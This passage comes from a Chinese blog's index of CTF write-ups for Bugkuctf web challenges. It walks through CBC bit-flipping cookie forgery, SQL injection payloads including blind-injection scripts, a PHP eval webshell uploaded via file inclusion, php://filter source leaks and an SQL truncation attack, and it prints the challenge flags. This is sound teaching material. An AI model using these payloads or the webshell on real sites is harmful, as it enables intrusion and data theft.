但是我们还要考虑，我们改变了密文分组的第9位，只会影响下一组明文翻转的那一位，但却会影响本组明文的全部，因为我们翻转过的密文要先经过解密，然后才和IV变量进行异或，解密的时候是整串数据进行，所以整串明文受其影响。甚至可能会导致生成的明文部分乱码，至少绝对不再是原来的明文了。 所以，我们还需要操作iv，也就是初始化向量，使它与解密的密文分组1异或能得到原来的明文分组1，也就是a:2:{s:8:”userna 最后就需要考虑如何得到我们想要的字符，直接看公式吧 123456789本组明文 = Decrypt(本组密文) ^ 上一组密文A B C=========================================================A = B ^ CA ^ A = 0; 0 ^ A = AC = A ^ A ^ C = B ^ C ^ A ^ C = A ^ B(即C = A ^ B ，即：上一组密文 = 本组明文 ^ Decrypt(本组密文) )ascii(&apos;a&apos;) ^ C ^ A ^ B = ascii(&apos;a&apos;) ^ A ^ B ^ A ^ B = ascii(&apos;a&apos;) ^ 0 = ascii(&apos;a&apos;)(假设我们想要翻转成a，使用如上公式即可,即：想要的字符 = 上一组密文 ^ 本组明文 ^ Decrypt(本组密文) ^ 想要的字符 ) 那么接下来，我们就可以开始编写脚本了，首先，我们先将用户名：Admin和密码：admin POST给服务器 然后获取cookie值的cipher字段，操作第一个密文分组的第九位 123456789101112131415161718import requests,base64,urllib,reurl = \"http://118.89.219.210:49168/\"data = &#123; 'username':'Admin', 'password':'admin'&#125;r = requests.post(url,data=data)cookies = requests.utils.dict_from_cookiejar(r.cookies)cipher = cookies['cipher']cipher = base64.b64decode(urllib.unquote(cipher))index = 9new_cipher = cipher[:index] + chr(ord(cipher[index])^ord('A')^ord('a')) + cipher[index+1:]new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))cookies['cipher'] = new_cipherr2 = requests.get(url,cookies=cookies)print r2.text 运行结果 可以看到修改cipher后，再次访问页面给出了提示解密后的明文的不能被序列化，就是因为我们操纵密文分组1，改变了全部的明文分组1，使之不能被序列化 我们将plain取出，解码 12plain = base64.b64decode(re.findall(\"base64_decode\\('(.*)'\\)\",r2.text)[0])print plain 可以看到，我们已经成功的将A翻转成a，但是导致了本组明文乱码 所以接下来我们要操作的是iv的全部十六位，下面给出所有代码 12345678910111213141516171819202122232425262728import requests,base64,urllib,reurl = \"http://118.89.219.210:49168/\"data = &#123; 'username':'Admin', 'password':'admin'&#125;r = requests.post(url,data=data)cookies = requests.utils.dict_from_cookiejar(r.cookies)cipher = cookies['cipher']cipher = base64.b64decode(urllib.unquote(cipher))index = 9new_cipher = cipher[:index] + chr(ord(cipher[index])^ord('A')^ord('a')) + cipher[index+1:]new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))cookies['cipher'] = new_cipherr2 = requests.get(url,cookies=cookies)plain = base64.b64decode(re.findall(\"base64_decode\\('(.*)'\\)\",r2.text)[0])iv = cookies['iv']iv = base64.b64decode(urllib.unquote(iv))target = 'a:2:&#123;s:8:\"userna'new_iv = ''for i in range(16): new_iv = new_iv + chr(ord(target[i])^ord(plain[i])^ord(iv[i]))cookies['iv'] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=cookies)print r3.text 运行结果 成功获得flag","categories":[{"name":"Bugkuctf-Web","slug":"Bugkuctf-Web","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"Bugkuctf-Web(3)","slug":"Bugkuctf-Web(3)","date":"2018-08-06T08:06:00.000Z","updated":"2018-08-11T05:43:28.693Z","comments":true,"path":"/posts/63286/","link":"","permalink":"https://Foxgrin.github.io/posts/63286/","excerpt":"Bugkuctf中的Web题解(三)","text":"Bugkuctf中的Web题解(三) 这是一个神奇的登录框网址：http://120.24.86.145:9001/sql/ 看到登录框，网址又有sql，八成就是sql注入 试一下用户名输入admin’，没有报错，再试试admin” 发现报错了，果然存在sql注入，从报错信息就看出来用户名和密码都被双引号包裹 那么我们就可以用万能密码登录了 payloads:admin_name=admin&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO 应该是登录成功了，但是要我们换一个身份登录才能拿到flag 换个payloads:admin_name=AdMiNhEhE&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO 结果还是一样的，看来是只返回了用户名的信息，那干脆就直接利用报错注入注出信息试试 先爆库 payloads:admin_name=admin” and extractvalue(1,concat(0x3a,database(),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 库名bugkusql1 爆表 payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 表名为flag1,whoami 爆flag1表下的列名 payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag1’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 列名为flag1 最后爆flag1列下的数据 payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(flag1) from flag1),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 试一下这个是不是flag，发现错误，仔细看才发现flag太长了报错信息没显示全… 那再试试爆whoami表吧，看看能不能爆出密码 先爆whoami表下的列名： payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’whoami’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 列名为w_id,w_name,w_passwd 爆passwd payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select w_passwd from whoami where w_name=’AdMiNhEhE’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 发现又太长了… 仔细一想，用万能密码登录时也是有返回信息的，为什么不用联合注入呢… 查询列数为2 payloads:admin_name=0” union select flag1,2 from flag1 #&amp;admin_passwd=&amp;submit=GO+GO+GO 输入flag{ed6b28e684817d9efcaf802979e57aea}，成功 多次网址：http://120.24.86.145:9004/ 一进去页面发现url：http://120.24.86.145:9004/1ndex.php?id=1 就尝试修改id值，id=1,2,3,4,5到5的时候提示 存在sql注入漏洞，猜测是数字型注入，注入点是id 那试一下id=1’，显示error 猜测可能id被单引号包裹，输入id=1’%23，正确显示信息，那么接下来注出查询列数 输入id=1’ order by 3%23，显示error，将3改为2，又eroor，改为1，还是error，慌了…估计是把order 或者by给过滤了 试一下输入id=1’ ^ (length(‘order’)!=0)%23，显示error，说明不是order被过滤 再试一下输入id=1’ ^ (length(‘or’)!=0)%23 发现正确显示信息，说明or被过滤掉了，类似再尝试一下关键词and,select,union，发现都被过滤了 尝试一下双写可不可以绕过，输入id=1’ oorrder by 2%23 正确显示信息，说明可能是用函数str_replace进行过滤，那么双写即可绕过 输入id=1’ oorrder by 3%23，显示error，说明查询列数为2 接下来就是熟悉爆库 输入id=0’ uunionnion sselectelect 1,database()%23 数据库名：web1002-1 爆表名 输入id=0’ uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23 表名：flag1,hint 爆列名 输入id=0’ uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=’flag1’%23 列名：flag1,address 爆flag列下的数据 输入id=0’ uunionnion sselectelect 1,flag1 from flag1%23 提交flag{usOwycTju+FTUUzXosjr}发现错误，突然发现提交的地方提示我们flag有两个 就试着注出address列下的数据 输入id=0’ uunionnion sselectelect 1,address from flag1%23 好像发现了新大陆 点击访问下一关 页面的url提示oncemore，并且get参数又是id，猜测还是sql注入 输入id=1’ 恩？好像隐约看到了报错信息，不过被背景挡住了，没事，看一下源代码 惊喜发现有报错信息，同时也看出来id被单引号包裹，接着试着注出查询列数 输入id=1’ order by 2%23，正常显示信息，输入id=1’ order by 3%23，报错。所以查询列数为2 接下来注库名 输入id=0’ union select 1,database()%23 发现union被过滤了，试着双写，没办法绕过 于是尝试extractvalue报错注入 输入id=1’ and extractvalue(1,concat(0x3a,database(),0x3a))%23 成功注入库名：web1002-2 输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))%23 表名：class,flag2 输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag2’),0x3a))%23 flag2表下列名：flag2,address 输入id=1’ and extractvalue(1,concat(0x3a,(select flag2 from flag2),0x3a))%23 注出flag：flag{Bugku-sql_6s-2i-4t-bug} 将B改成小写b，提交成功 PHP_encrypt_1(ISCCCTF)这题直接给了一个php源文件 12345678910111213141516171819202122&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt;output: fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= (PS:可能题目文件出了问题，output没有写在源文件中) 审计后发现是一个加密的过程，给了最后的输出，需要我们自己编写解密的过程，根据加密的过程一步步解密，decrypt代码如下： 123456789101112131415161718192021222324252627282930313233&lt;?phpfunction decrypt($str)&#123; $str = base64_decode($str); // 将encrypt最后的base64加密后的结果进行base64解密 $key = md5('ISCC'); // 对应encrypt的$key $x = 0; // 对应encrypt的$x $len = strlen($str); // $最后encrypt得到的$str长度跟原本encrypt传入的$data长度是一致的 $klen = strlen($key); // 对应encrypt的$klen $char = ''; // 对应encrypt的$char $data = ''; // 对应encrypt的$data for($i = 0; $i &lt; $len; $i++)&#123; //对应encrypt的$char赋值过程 if($x == $klen)&#123; $x = 0; &#125; $char .= $key[$x]; $x += 1; &#125; for($i = 0; $i &lt; $len; $i++)&#123; // 获得$data if(ord($str[$i]) &lt; ord($char[$i]))&#123; // 如果$str的某位的ascii值小于$char的某位的ascii值 $data .= chr((ord($str[$i]) + 128) - ord($char[$i])); // 说明encrypt有求余128 &#125; else&#123; $data .= chr(ord($str[$i]) - ord($char[$i])); &#125; &#125; return $data;&#125;$str = \"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=\";$data = decrypt($str);echo $data;?&gt; 最后获得flag 文件包含2网址：http://118.89.219.210:49166/ 页面url：http://118.89.219.210:49166/index.php?file=hello.php 熟悉的文件包含，试一下利用php://filter读取index.php源码 天真！！！看来貌似过滤了什么，试一下读取hellp.php，还是一样的结果，看来这个方法行不通，怎么办呢，这时候看一下失败页面的源码 发现提示了文件upload.php 访问http://118.89.219.210:49166/upload.php 发现是文件上传，要求只能上传图片文件，burp抓包上传一句话试试 发现过滤了文件名和类型，但是因为有文件包含，我们只要能将一句话包含在文件上传上去就行，将php文件后缀修改为png，文件类型修改为image/png，上传成功后访问图片所在地址 可以看到代码显示了出来，说明是不符合php语法的代码，仔细看发现php代码开头的&lt;?php ?&gt;被过滤了 那么换一种方法，上传代码为&lt;?=@eval($_POST[‘cmd’]); 上传成功，访问页面为空，说明代码成功执行 然后再用burp POST参数cmd执行命令 访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt 获得flag flag.php网址：http://120.24.86.145:8002/flagphp/ 点击页面Login按钮没反应，看一下源代码只是个按钮，用burp试着POST提交user和password参数也没有显示其他的东西，想到题目给的提示：hint，试着访问hint.php，没有结果，题目是flag.php，访问，也没有提示 一番思考，试着GET参数hint，没想到就给出了源代码 1234567891011121314151617181920212223242526272829303132333435&lt;?php error_reporting(0); include_once(\"flag.php\"); $cookie = $_COOKIE['ISecer']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === \"$KEY\") &#123; echo \"$flag\"; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"admin.css\" type=\"text/css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=\"container\" align=\"center\"&gt; &lt;form method=\"POST\" action=\"#\"&gt; &lt;p&gt;&lt;input name=\"user\" type=\"text\" placeholder=\"Username\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=\"password\" type=\"password\" placeholder=\"Password\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=\"Login\" type=\"button\"/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php &#125; $KEY='ISecer:www.isecer.com'; ?&gt; 那就变成一道代码审计题了，要我们在COOKIE字段中添加ISecer参数，值是$KEY序列化后的值 先写个demo，把$KEY序列化后的值打印出来 1234567&lt;?php$KEY = 'ISecer:www.isecer.com';$cookie = serialize($KEY);echo $cookie;?&gt; 然后用burp提交cookie 没反应…很奇怪，想了很久，看了好久源代码才发现，$KEY值是定义在最后面的，前面是为空的，所以应该提交空字符串的序列化值…很坑 空字符串序列化值：s:0:””; 再次burp提交 拿到flag 报错注入网址：http://103.238.227.13:10088/ 根据题目的提示，这是一个数字型注入，注入点为GET的参数id，过滤了关键词：空格，单引号，双引号，union，– 空格可以用%0a替代，union被过滤了那么就用题目的意思：报错注入，注释可以用%23代替– 直接输入?id=1%23试试 发现正常显示，那么id就没有被引号包裹，其实就无所谓单双引号被过滤了 那么我们就可以开始爆库了，输入： ?id=1%0aand%0aextractvalue(1,concat(0x3a,database(),0x3a))%23 数据库名为sql4 爆表，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x3a))%23 表名为temp 爆列，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=0x74656d70),0x3a))%23 列名为id,title 爆数据，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(title)%0afrom%0atemp),0x3a))%23 没发现flag… 说明flag不在数据库里，回到题目页面，又看到了提示，查询文件在/var/test/key_1.php 说明可能要用mysql的load_file函数读取文件内容，再通过hex函数转化为十六进制数 输入?id=1%0aand%0aextractvalue(1,concat(0x3a,hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),0x3a))%23 可以看到没有全部读取，这就是extractvalue函数的缺点，只能读取32位 这时候就需要利用substr函数每次截取30位读 先读取前30位 输入?id=1%0aand%0aextractvalue(1,concat(0x3a,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30),0x3a))%23 再读取31~60位，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30),0x3a))%23 依次类推 最后得到298位十六进制数 13C3F70687020666473616661736664736166696473616664736169666473616B666473616966647361666473616664736166647361666B6473613B6664736166647361667364616664736166617330686664736739466C61673A22373234396635613766643164653630326233306536663339616561363139336122667364616673616664736166647361666473616661203F3E0A 转化成字符串得： 1&lt;?php fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:\"7249f5a7fd1de602b30e6f39aea6193a\"fsdafsafdsafdsafdsafa ?&gt; 得到 Flag:”7249f5a7fd1de602b30e6f39aea6193a” login3(SKCTF)网址：http://118.89.219.210:49167/ 登录界面，随便输入一个用户名1，密码1，提示用户名不存在，输入admin,密码1，提示密码错误，猜测有检查用户名是否存在的判断，猜测注入点在admin,输入admin’，提示用户不存在，输入admin’#，提示密码错误，很显然admin被单引号包裹 那么理清思路，这是字符型注入，注入点在admin,admin被单引号包裹，题目提示我们这是一题基于布尔的盲注 那么我们试试输入admin’ and 1=1#，发现提示了出现非法字符,oh no ，我们直接输入and，同样提示出现非法字符，看来and被过滤了，那不用and了，我们用异或^ 输入admin’^1#，提示用户名不存在，输入admin’^0#，提示密码错误，很好，那么就可以利用这个提示信息进行基于布尔的盲注 接下来就是搞定逻辑语句了，正常来说我们是用语句ascii(substr(database(),1,1))=数字，但是尝试就发现了，这题还过滤了逗号，等号，等号可以用不等号&lt;&gt;代替，那么用ascii(substr(database() from 1 for 1))=数字，这样可以吗，又发现for和空格被过滤了… 怎么办，借鉴了别人的思路，才发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值 如图所示，语句ascii(substr(database()from(1)))就可以输出数据库名第一位的ascii值 那么思路就很清晰了，根据输入admin’^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#，根据返回的信息，如果返回了”password error!” ，说明数字2就是数据库的第数字1位的ascii值 直接上脚本，注出数据库名： 123456789101112131415161718192021import requestsurl = 'http://118.89.219.210:49167/index.php'all_string = '''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''database = ''for i in range(1,11): for j in all_string: print('checking '+j) data = &#123; 'username':\"admin'^(ascii(substr(database()from(%d)))&lt;&gt;%d)#\"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: database = database + j print('the '+str(i)+' place of database is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(database) 数据库名：blindsql 本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜 看别人猜的表名为admin，列名为password，真是玄学… 那就直接爆password： 123456789101112131415161718192021import requestsurl = 'http://118.89.219.210:49167/index.php'all_string = '''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''password = ''for i in range(1,51): for j in all_string: print('checking '+j) data = &#123; 'username':\"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#\"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: password = password + j print('the '+str(i)+' place of password is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(password) 得password：51b7a76d51e70b419f60d3473fb6f900 还得拿去md5解密，解密得skctf123456 获得flag 网站被黑网址：http://120.24.86.145:8002/webshell/ 啥提示都没有，只有url有个提示webshell，试着扫一下后台 发现shell.php 进去要输入密码才能看到flag，不是sql，只能burp爆破密码，爆破出来密码是hack Trim的日记本网址：http://120.24.86.145:9002/ 看着像是sql二次注入，但是死活找不到注入点，id一直不知道处理，试着扫一下后台 访问一下show.php 直接给出了flag 文件上传2网址：http://120.24.86.145:9011/ 看页面像是文件上传，但是尝试上传png文件，jpg文件都上传不了，再看看url有个op参数，看着有点像是文件包含，试着用php伪协议读一下文件看看能不能读出来，payloads: http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=index 这里不用加php后缀名，读出了index.php的base64源码 base64解码得 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phperror_reporting(0);define('FROM_INDEX', 1);$op = empty($_GET['op']) ? 'home' : $_GET['op'];if(!is_string($op) || preg_match('/\\.\\./', $op)) die('Try it again and I will kill you! I freaking hate hackers!');ob_start('ob_gzhandler');function page_top($op) &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Panduploader::&lt;?= htmlentities(ucfirst($op)); ?&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"header\"&gt; &lt;center&gt;&lt;a href=\"?op=home\" class=\"logo\"&gt;&lt;img src=\"images/logo.jpg\" alt=\"\"&gt;&lt;/a&gt;&lt;/center&gt; &lt;/div&gt; &lt;div id=\"body\"&gt;&lt;?php&#125;function fatal($msg) &#123;?&gt;&lt;div class=\"article\"&gt;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;&lt;/div&gt;&lt;?phpexit(1);&#125;function page_bottom() &#123;?&gt; &lt;/div&gt; &lt;center&gt; &lt;div id=\"footer\"&gt; &lt;div&gt; &lt;p&gt; &lt;span&gt;2017 &amp;copy; &lt;/span&gt; All rights reserved. &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpob_end_flush();&#125;register_shutdown_function('page_bottom');page_top($op);if(!(include $op . '.php')) fatal('no such page');?&gt; 再读取home.php，http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=home 123456789101112131415&lt;?phpinclude 'common.php';?&gt;&lt;center&gt;&lt;div class=\"article\"&gt; &lt;h2&gt;Welcome!!&lt;/h2&gt; &lt;p&gt; We let you upload PNG image files and store it!&lt;br/&gt; &lt;/p&gt; &lt;p&gt; Get started by &lt;a href=\"?op=upload\"&gt;uploading a picture&lt;/a&gt; &lt;/p&gt; &lt;/div&gt;&lt;/center&gt; 发现又包含了common.php，不急，先读upload.php的源代码，http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=upload.php 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpinclude 'common.php';if(isset($_POST['submit']) &amp;&amp; isset($_FILES['image'])) &#123; $fn = $_FILES['image']['tmp_name']; $ft = $_FILES['image']['type']; if(!is_uploaded_file($fn)) &#123; fatal('uploaded file corrupted'); &#125; $array = array('image/png'); if(!in_array($ft,$array))&#123; fatal(\"Sorry, only PNG files are allowed.\"); &#125; $imagekey = create_image_key(); move_uploaded_file($fn, \"uploads/$imagekey.png\"); header(\"Location: ?op=show&amp;imagekey=$imagekey\");&#125; else &#123;?&gt;&lt;center&gt;&lt;div class=\"article\"&gt; &lt;h2&gt;Upload your own png file&lt;/h2&gt; &lt;form enctype=\"multipart/form-data\" action=\"?op=upload\" method=\"POST\"&gt; &lt;label for=\"image\"&gt;Image file (max &lt;?=MAX_IM_SIZE;?&gt;x&lt;?=MAX_IM_SIZE;?&gt;): &lt;/label&gt; &lt;input type=\"file\" id=\"image\" name=\"image\" /&gt; &lt;br /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Upload!\" /&gt; &lt;/form&gt;&lt;/div&gt;&lt;/center&gt;&lt;?php&#125;?&gt; 再看一下common.php，http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=common 12345678910111213141516171819202122&lt;?phpif(!defined('FROM_INDEX')) die();define('MAX_IM_SIZE', 100);function create_image_key() &#123; return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());&#125;function load_image($imagekey) &#123; if(1 !== preg_match('/[0-9a-f]&#123;40&#125;/', $imagekey)) &#123; fatal('Invalid image key.'); &#125; $im = imagecreatefrompng(\"uploads/&#123;$imagekey&#125;.png\"); if(!$im) &#123; fatal('Failed to load image.'); &#125; return $im;&#125;stream_wrapper_unregister (\"zip\");?&gt; 可以看出我们上传文件首先对上传文件类型进行检查，检查是不是png类型的文件，如果是，则重定向到show.php 那么我们再看看show.php的源代码 http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=show 1234567891011121314151617181920212223242526&lt;?phpinclude 'common.php';if(empty($_GET['imagekey'])) &#123; header('Location: ?op=home'); exit();&#125;$imagekey = $_GET['imagekey'];$im = load_image($imagekey);$w = imagesx($im);$h = imagesy($im);if($w &gt; MAX_IM_SIZE || $h &gt; MAX_IM_SIZE) fatal(\"Invalid image dimensions.\");?&gt;&lt;center&gt;&lt;div class=\"article\"&gt; &lt;h2&gt;&lt;/h2&gt; &lt;p&gt;&lt;img src=\"uploads/&lt;?=$imagekey;?&gt;.png\" /&gt; &lt;div&gt; &lt;a href=\"uploads/&lt;?=$imagekey;?&gt;.png\"&gt;View saved image&lt;/a&gt; &lt;/div&gt;&lt;/div&gt;&lt;/center&gt; 看不出所以然，即使最后上传成功文件，也没显示flag，那么直接输入op=flag，发现没有提示错误，说明有这个文件，那么就同样利用php://filter读取源代码 http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag 解码得 123&lt;?php $flag=\"flag&#123;e00f8931037cbdb25f6b1d82dfe5552f&#125;\"; ?&gt;","categories":[{"name":"Bugkuctf-Web","slug":"Bugkuctf-Web","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"sql约束攻击","slug":"sql约束攻击","date":"2018-08-04T08:58:00.000Z","updated":"2018-08-06T03:45:00.811Z","comments":true,"path":"/posts/22848/","link":"","permalink":"https://Foxgrin.github.io/posts/22848/","excerpt":"做ctf的题时刚好做到要用sql约束攻击的题，赶紧去看看别人的文章学习一下这种攻击","text":"做ctf的题时刚好做到要用sql约束攻击的题，赶紧去看看别人的文章学习一下这种攻击 题目大致上是一个登陆界面和一个注册界面，需要我们用管理员的身份登陆才能拿到flag值 登陆页面： 12345678910111213141516171819&lt;?phpinclude('connection.php');if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = mysql_real_escape_string($_POST['username']); $password = mysql_real_escape_string($_POST['password']); $sql = \"SELECT username,password FROM users WHERE username='$username' AND password='$password'\"; $result = mysql_query($sql); $row = mysql_fetch_array($result); if($row)&#123; echo 'hello '.$username; &#125; else&#123; echo 'username was not exist or password was wrong'; &#125;&#125;?&gt; 注册页面： 12345678910111213141516171819202122&lt;?phpinclude('connection.php');if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $username = mysql_real_escape_string($_POST['username']); $password = mysql_real_escape_string($_POST['password']); $sql = \"SELECT username FROM users WHERE username='$username'\"; $result = mysql_query($sql); $row = mysql_fetch_array($result); if($row)&#123; die('username has exist'); &#125; else&#123; $sql = \"INSERT INTO users(username,password) values('$username','$password')\"; $result = mysql_query($sql); echo 'regist successfully'; header('location:login.php'); &#125;&#125;?&gt; 看似对用户的输入进行了转义的过滤，能防止sql注入，但是我们还是有办法能登录任意已存在的账号 下面演示具体过程： 首先先创建一个数据库test，再test库下建立users表，里面的列名为username和password 注意这里对用户名和密码字符串长度限制最大为15位 接着创建一个管理员身份账户，用户名为admin，密码为123456 然后我们以攻击者的身份要以管理员身份登陆，首先注册用户，用户名为admin+若干个空格+1，这里空格在10个以上，原因后面会提到 这时候我们注册页面首先会进行是否存在注册的用户名的查询 没有查询到结果，所以成功绕过了查询，这里就可以解释一下为什么要在末尾加1，其实1是随便加的，任何字母数字都可以，原因是mysql进行select查询时，会忽略末尾的若干个空格，例如我们执行sql语句：”select username,password from users where username=’admin ‘ “ 结果跟没有加空格是一样的，那么我们要绕过是否存在用户名的查询，如果只在末尾加空格，是会被检测到存在admin用户，所以我们在末尾加个任意字符，就可以绕过这个查询 那么为什么空格要在10个以上呢，我们继续看下去 下面注册页面执行的是insert语句 可见成功的注册了 我们再来查询一下”select username,password from users where username=’admin’ “ 这时候发现有两个admin用户，但是这两个用户其实是不一样的，因为我们之前说过了，mysql在select查询时会将末尾空格忽略，而mysql在insert操作时不会忽略空格，也就是说我们以攻击者身份注册的用户名’admin 1’中的空格不会被省略，这里肯定就有疑问，那么1跑哪里去了，答案很简单，我们之前就已经限制了username的最大长度为15，这里空格在10个以上，加上admin的5个长度，所以长度在15以上的字符就被截断了，之前的才会被写入数据库，那么实际上写入数据库的就是admin+10个空格，但是我们登录查询select语句会自动忽略空格，所以将后面没有空格的admin和加了10个空格的admin都查询了出来 也就是说，我们在登录页面输入用户名为admin，密码为aaa，就会有查询结果，也就以管理员身份登录成功了 当然我们查询到的并不是真正的admin用户，但是服务器只检测有没有查询结果，有则认为我们登录成功 那么防御手段也挺简单就能想到，我们只需要对查询的结果进行检查，检查查询到的用户密码是不是之前设置的管理员密码，就可以防御了 最后附上参考链接：https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html","categories":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/categories/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"Bugkuctf-Web(2)","slug":"Bugkuctf-Web(2)","date":"2018-08-02T14:48:00.000Z","updated":"2018-08-06T03:45:00.809Z","comments":true,"path":"/posts/26423/","link":"","permalink":"https://Foxgrin.github.io/posts/26423/","excerpt":"Bugkuctf中的Web题解(二)","text":"Bugkuctf中的Web题解(二) cookies欺骗网址：http://120.24.86.145:8002/web11/ 进去页面一看是一串乱码，但发现url中包含参数filename=a2V5cy50eHQ=，将a2V5cy50eHQ=进行base64解码得keys.txt，将index.php进行base64加密后赋值给filename参数，同时指定line参数的值为1，发现输出了php代码 于是猜测line为行数，写个脚本读出index.php的所有代码 1234567import requestsfor i in range(0,100): url = 'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw'%i r = requests.get(url) if r.text: print(r.text,end='') 结果： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;);$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(&apos;0&apos; =&gt;&apos;keys.txt&apos;,&apos;1&apos; =&gt;&apos;index.php&apos;,); if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123;$file_list[2]=&apos;keys.php&apos;;&#125; if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; 从源代码可以看出，flag在keys.php中，而我们要逐行读取keys.php文件的内容，就必须设置cookie:margin=margin 直接上脚本： 12345678910import requestscookie = &#123; 'margin':'margin' &#125;for i in range(0,100): url = 'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=a2V5cy5waHA='%i r = requests.get(url,cookies=cookie) 